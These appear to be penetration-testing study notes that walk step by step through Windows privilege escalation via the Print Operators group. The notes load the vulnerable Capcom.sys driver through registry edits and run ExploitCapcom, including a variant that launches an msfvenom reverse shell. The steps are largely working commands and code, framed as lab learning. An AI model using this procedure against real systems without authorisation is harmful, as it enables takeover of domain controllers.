# Windows Print Operators

* [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.

## Exploitation - With GUI

### Confirming Privileges

```cmd-session
whoami /priv
```

### Checking Privileges Again

* use admin cmd

```cmd-session
whoami /priv
```

```cmd-session
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
-----------------------------------------------------------
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

* It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges.
* We can use our privileges to load this vulnerable driver and escalate privileges.
  * We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver.
    * The PoC enables the privilege as well as loads the driver for us.
* Download it locally and edit it, pasting over the includes below.

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

* Next, from a Visual Studio 2019 Developer Command Prompt, compile it using **cl.exe**.

### Compile with cl.exe

```cmd-session
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

### Add Reference to Driver

```cmd-session
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

```cmd-session
 reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

* The odd syntax `\??\` used to reference our malicious driver's ImagePath is an [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). The Win32 API will parse and resolve this path to properly locate and load our malicious driver.

### Verify Driver is not Loaded

* Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded

```powershell-session
.\DriverView.exe /stext drivers.txt
```

```powershell-session
cat drivers.txt | Select-String -pattern Capcom
```

* no output should come

### Verify Privilege is Enabled

* Run the `EnableSeLoadDriverPrivilege.exe` binary.

```cmd-session
EnableSeLoadDriverPrivilege.exe
```

### Verify Capcom Driver is Listed

```powershell-session
.\DriverView.exe /stext drivers.txt
```

```powershell-session
cat drivers.txt | Select-String -pattern Capcom
```

### Use ExploitCapcom Tool to Escalate Privileges

* To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.

```powershell-session
.\ExploitCapcom.exe
```

* This launches a shell with SYSTEM privileges. !\[\[Pasted image 20240806113634.png]]

## Alternate Exploitation - No GUI

* &#x20;we will have to modify the `ExploitCapcom.cpp` code before compiling.
* Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

* The `CommandLine` string in this example would be changed to:

```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

* We would set up a listener based on the `msfvenom` payload we generated and hopefully receive a reverse shell connection back when executing `ExploitCapcom.exe`.
* If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.

### Automating the Steps

#### Automating with EopLoadDriver

* We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver.
* To do this, we would run the following:

```cmd-session
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

* We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

## Clean-up

#### Removing Registry Key

```cmd-session
reg delete HKCU\System\CurrentControlSet\Capcom
```

**Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY\_CURRENT\_USER".**
